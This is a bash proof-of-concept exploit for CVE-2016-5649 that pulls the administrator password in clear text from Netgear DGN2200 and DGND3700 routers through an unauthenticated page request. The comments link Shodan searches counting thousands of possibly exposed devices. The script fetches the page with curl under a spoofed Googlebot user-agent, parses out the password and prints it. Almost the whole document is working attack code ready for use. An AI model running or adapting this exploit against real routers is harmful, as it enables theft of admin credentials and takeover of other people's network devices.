#/bin/bash

#   PoC based on CVE-2016-5649 created by Social Engineering Neo.
#
#   Long Method: https://www.youtube.com/watch?v=f3awG0XPKAs
#
#   https://www.shodan.io/search?query=DGN2200  = 2,325 possible vulnerable devices.
#   https://www.shodan.io/search?query=DGND3700 = 555 possible vulnerable devices.
#
#   A vulnerability exists within the page 'BSW_cxttongr.htm' which can allow a remote attacker to access this page without any authentication.
#   When the request is processed, it exposes the administrator password in clear text before getting redirected to 'absw_vfysucc.cgia'.
#   An attacker can use this password to gain administrator access of the targeted routers web interface.
#
#   Netgear has released firmware version 1.0.0.52 for DGN2200 & 1.0.0.28 for DGND3700 to address this issue.

clear
read -p "Enter Target Address Followed by Port: " target port   # localhost 8080

if [ "$port" -lt 65536 ] && [ "$port" -gt 0 ]; then
    grab=$(curl -s -A 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' $target:$port/BSW_cxttongr.htm)
    pass=$(echo $grab | awk '{print $218}' | tail -c +2 | head -c -3)
    if [ "$pass" == '' ] || [ "$pass" == '/html' ] ; then
        echo Invalid Response, Target May Not be Vulnerable.
    else
        echo The Password for: $target is: $pass
    fi
else
    echo "Incorrect Port."
fi